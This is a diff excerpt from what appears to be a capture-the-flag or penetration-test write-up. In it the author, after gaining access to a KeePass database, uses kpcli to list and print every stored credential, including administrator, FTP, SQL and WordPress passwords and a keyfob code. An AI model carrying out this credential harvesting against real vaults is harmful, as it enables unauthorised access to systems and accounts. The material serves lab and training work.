@@ -214,3 +214,114 @@ Type 'help <command>' for details on individual commands.
 kpcli:/>
 ```
 Now i have access to the database
+
+```python
+kpcli:/Shared> ls
+=== Groups ===
+Finance/
+HelpDesk/
+IT/
+kpcli:/Shared> cd Finance/
+kpcli:/Shared/Finance> ls
+=== Entries ===
+0. Payrol App                                                             
+1. Timesheet Manager                                                      
+kpcli:/Shared/Finance> show -a 0
+
+Title: Payrol App
+Uname: Payroll
+ Pass: cVkqz4bCM7kJRSNlgx2G
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 12:13:50
+Modif: 2024-10-20 12:14:11
+Xpire: Never
+
+kpcli:/Shared/Finance> show -a 1
+
+Title: Timesheet Manager
+Uname: Timesheet
+ Pass: hMFS4I0Kj8Rcd62vqi5X
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 12:13:30
+Modif: 2024-10-20 12:14:18
+Xpire: Never
+
+kpcli:/Shared/Finance> cd ../HelpDesk/
+kpcli:/Shared/HelpDesk> ls
+=== Entries ===
+0. KeyFob Combination                                                     
+kpcli:/Shared/HelpDesk> show -a 0
+
+Title: KeyFob Combination
+Uname: 
+ Pass: 22331144
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 12:12:09
+Modif: 2024-10-20 12:12:32
+Xpire: Never
+
+kpcli:/Shared/HelpDesk> cd ../IT/
+kpcli:/Shared/IT> ls
+=== Entries ===
+0. FS01 Admin                                                             
+1. FTP                                                                    
+2. SQL Guest Access                                                       
+3. WEB01                                                                  
+kpcli:/Shared/IT> show -a 0
+
+Title: FS01 Admin
+Uname: Administrator
+ Pass: Spdv41gg4BlBgSYIW1gF
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 07:57:02
+Modif: 2024-10-20 07:57:21
+Xpire: Never
+
+kpcli:/Shared/IT> show -a 1
+
+Title: FTP
+Uname: FTPUser
+ Pass: SguPZBKdRyxWzvXRWy6U
+  URL: 
+Notes: Deprecated
+Icon#: 0
+Creat: 2024-10-20 07:56:20
+Modif: 2024-10-20 07:56:58
+Xpire: Never
+
+kpcli:/Shared/IT> show -a 2
+
+Title: SQL Guest Access
+Uname: SQLGuest
+ Pass: zDPBpaF4FywlqIv11vii
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 08:26:48
+Modif: 2024-10-20 08:27:09
+Xpire: Never
+
+kpcli:/Shared/IT> show -a 3
+
+Title: WEB01
+Uname: WordPress Panel
+ Pass: cn4KOEgsHqvKXPjEnSD9
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 07:57:24
+Modif: 2024-10-20 08:00:25
+Xpire: Never
+
+kpcli:/Shared/IT>
+```
+I now have a bunch of passwords
+
